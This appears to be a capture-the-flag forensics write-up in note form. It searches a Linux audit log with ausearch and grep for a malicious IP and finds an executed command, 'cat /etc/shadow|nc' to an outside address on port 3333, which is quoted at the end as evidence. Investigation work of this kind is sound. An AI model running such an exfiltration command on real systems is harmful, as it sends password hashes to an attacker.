@@ -1,0 +1,198 @@
+
+ausearch -if audit.log | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | sort | uniq -c
+
+     72 10.0.2.15
+   2958 10.0.2.2
+      1 2.4.17.1
+
+# none of these are it?  
+
+
+# search for successful operations:
+
+ausearch -m AVC,USER_AVC -i --success yes -if /root/acictf/misc/i_SEe_you/audit.log 
+
+<no matches>
+
+ausearch -m AVC,USER_AVC -i --success no -if /root/acictf/misc/i_SEe_you/audit.log
+
+<no matches>
+
+
+# use - instead of a .
+ausearch -if audit.log | grep -E -o "([0-9]{1,3}[\-]){3}[0-9]{1,3}" | sort | uniq -c
+
+    196 10-0-2-15
+
+# need to use the -i option  converts the saddr field to IP addresses?
+
+ausearch -if audit.log -i | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | sort | uniq -c
+
+
+# a ton of output, all of them only have one:
+
+  4 0.0.0.0
+      1 100.100.7.196
+      1 100.106.169.10
+      1 100.113.167.182
+      1 100.113.68.253
+      1 100.124.57.101
+      1 100.138.201.36
+      1 100.194.235.42
+      1 100.207.185.249
+      1 100.208.60.240
+
+# 7860 uniq IPs, need to find one with malicious intent 
+# search for USR_CMD - Triggered when a user-space shell command is executed.
+
+
+ausearch -if audit.log -i -m USER_CMD | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+#none
+# some output without the IPS 
+
+
+ausearch -if audit.log -i -m USER_ACCT | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+#none
+
+ausearch -if audit.log -i -m ANOM_EXEC | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+ausearch -if audit.log -i -m ANOM_EXEC
+# no matches with ausearch
+
+ausearch -if audit.log -i -m ANOM_MK_EXEC | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+# no matches with ausearch
+
+ausearch -if audit.log -i -m BPRM_FCAPS | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+# no matches with ausearch
+
+ausearch -if audit.log -i -m RESP_EXEC | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+# no matches with ausearch
+
+ausearch -if audit.log -i -m RESP_EXEC | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+# none 
+
+ausearch -if audit.log -i -m USER_AUTH	 | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+# all from 10.0.2.2
+acct=vagrant
+
+# must be the user account?
+
+ausearch -if audit.log -i -m USER_LOGIN | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+# all from 10.0.2.2
+
+ausearch -if audit.log -i -m USER_LOGOUT | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+# same
+
+ausearch -if audit.log -i -m ADD_USER | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+
+
+# lets look at each of the commands that were run:
+ausearch -if audit.log -i -m USER_CMD > USER_CMD.txt
+
+cat USER_CMD.txt | awk {'print $11,$12, $13'}
+
+ausearch -if audit.log -i -m USER_START
+
+
+ausearch -if audit.log -i -m ANOM_LOGIN_LOCATION
+# no matches 
+
+# what command and executable am I looking for?
+
+# lets get the uniq types 
+
+ausearch -if audit.log | awk {'print $1'} > types.txt
+
+cat types.txt | sort | uniq -c
+
+      1 type=ADD_GROUP
+      8 type=ADD_USER
+     16 type=CONFIG_CHANGE
+     38 type=CRED_ACQ
+     47 type=CRED_DISP
+     30 type=CRED_REFR
+    576 type=CRYPTO_KEY_USER
+     38 type=CRYPTO_SESSION
+   1604 type=CWD
+      5 type=DAEMON_END
+      6 type=DAEMON_START
+      3 type=EXECVE
+      6 type=FD_PAIR
+      5 type=GRP_MGMT
+     19 type=LOGIN
+      1 type=MAC_POLICY_LOAD
+    127 type=MMAP
+   1606 type=PATH
+ 122114 type=PROCTITLE
+    195 type=SERVICE_START
+    117 type=SERVICE_STOP
+   7866 type=SOCKADDR
+    198 type=SOFTWARE_UPDATE
+ 122114 type=SYSCALL
+      4 type=SYSTEM_BOOT
+      4 type=SYSTEM_RUNLEVEL
+      2 type=SYSTEM_SHUTDOWN
+     49 type=USER_ACCT
+     57 type=USER_AUTH
+      1 type=USER_AVC
+     30 type=USER_CMD
+    372 type=USER_END
+    329 type=USER_LOGIN
+    325 type=USER_LOGOUT
+      1 type=USER_MGMT
+     19 type=USER_ROLE_CHANGE
+    375 type=USER_START
+
+# lets look at what each if these do...
+
+
+ausearch -if audit.log -i -m ADD_GROUP
+ausearch -if audit.log -i -m ADD_USER
+ausearch -if audit.log -i -m CONFIG_CHANGE
+ausearch -if audit.log -i -m SOCKADDR
+ausearch -if audit.log -i -m USER_MGMT
+
+ausearch -if audit.log -i -m SOCKADDR | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | sort | uniq -c
+
+ausearch -if audit.log -i -m SOCKADDR | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | sort | uniq -c | sort -rn | head
+
+# 10.0.2.3 has the most?  
+# not it 
+# everything else is one?? 
+
+# found pam2
+
+ausearch -if audit.log -i -m USER_MGMT
+# pam_tally2 module is used to lock user accounts after certain number of failed ssh login attempts made to the system. ...
+
+ausearch -if audit.log -i -m USER_AVC
+
+ausearch -if audit.log -i -m USER_AUTH
+
+ausearch -if audit.log -i -m SYSCALL | grep sudo
+
+# grap the commands from syscall
+
+# ok here is how did it 
+
+#look at SOCKAdder : 
+
+#look at syscall , everything that comes right before it is  the SOCKADDRE, now look at what command each of them are running with the comm option -c
+
+ausearch -if audit.log -i -m SYSCALL | grep -E -A1 "([0-9]{1,3}[\.]){3}[0-9]{1,3}" | awk {'print $27'} > comm.txt
+
+cat comm.txt | sort | uniq -c
+
+  15729 
+   7864 comm=python3
+      1 comm=sh
+
+# one instance had sh that is suspicious?
+
+ausearch -if audit.log -i -m SYSCALL -c sh | grep -E -A1 "([0-9]{1,3}[\.]){3}[0-9]{1,3}"
+
+type=EXECVE msg=audit(11/19/2019 06:31:30.007:46336) : argc=3 a0=/bin/sh a1=-c a2=cat /etc/shadow|nc 44.68.139.241 3333 
+type=SYSCALL msg=audit(11/19/2019 06:31:30.007:46336) : arch=x86_64 syscall=execve success=yes exit=0 a0=0x7f44c0c15870 a1=0x7f44c0b20930 a2=0x7ffeac0bfa60 a3=0x7f44cee4a770 items=2 ppid=2628 pid=5403 auid=ftpuser uid=root gid=root euid=root suid=root fsuid=root egid=root sgid=root fsgid=root tty=(none) ses=2 comm=sh exe=/usr/bin/bash subj=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023 key=(null) 
+
+Not even a SOCKADDR
+
+# someone tried to output the contents of etc/shadow to 44.68.139.241
